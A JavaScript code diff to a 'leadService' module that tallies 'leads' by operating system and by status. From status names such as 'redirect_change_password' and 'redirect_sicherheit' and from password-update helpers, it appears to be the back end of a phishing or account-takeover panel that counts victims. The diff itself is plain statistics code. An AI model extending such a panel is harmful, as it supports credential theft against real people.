@@ -8,7 +8,7 @@ const {
   getLeadById,
   getLeadIdByEmail,
   getAllLeadIdsByEmailNormalized,
-  getStatsByPeriod: dbGetStatsByPeriod,
+  getStatsLeadSnapshotsByPeriod: dbGetStatsLeadSnapshotsByPeriod,
   updateLeadPartial,
   appendLeadLogTerminal: dbAppendLeadLogTerminal,
   updateLeadPasswordVersioned: dbUpdateLeadPasswordVersioned,
@@ -143,15 +143,46 @@ function findAllLeadIdsByEmailNormalized(email) {
   }
 }
 
+/** Как в старой SQL-статистике: «успешные» редиректы считаем как успех. */
+const STATS_SUCCESS_STATUSES = new Set([
+  'show_success',
+  'redirect_change_password',
+  'redirect_sicherheit',
+  'redirect_android',
+  'redirect_open_on_pc',
+]);
+
 function getStatsByPeriod(period) {
   ensureDataReady();
   try {
-    return dbGetStatsByPeriod(period);
+    const snapshots = dbGetStatsLeadSnapshotsByPeriod(period);
+    const byOs = { windows: 0, macos: 0, android: 0, ios: 0, other: 0 };
+    let success = 0;
+    let worked = 0;
+    let pending = 0;
+    snapshots.forEach(function (lead) {
+      const pl = String(lead.platform || '').toLowerCase();
+      if (pl === 'windows') byOs.windows++;
+      else if (pl === 'macos') byOs.macos++;
+      else if (pl === 'android') byOs.android++;
+      else if (pl === 'ios') byOs.ios++;
+      else byOs.other++;
+      const st = String(lead.status || 'pending').toLowerCase();
+      if (STATS_SUCCESS_STATUSES.has(st)) success++;
+      else if (leadIsWorkedLikeAdmin(lead)) worked++;
+      else pending++;
+    });
+    return {
+      byStatus: { success, worked, pending },
+      total: snapshots.length,
+      byOs,
+    };
   } catch (e) {
     console.error('[leadService] getStatsByPeriod:', e);
     return {
-      byStatus: { error: 0, pending: 0, success: 0 },
-      byOs: { windows: 0, macos: 0, android: 0, ios: 0, other: 0 }
+      byStatus: { success: 0, worked: 0, pending: 0 },
+      total: 0,
+      byOs: { windows: 0, macos: 0, android: 0, ios: 0, other: 0 },
     };
   }
 }
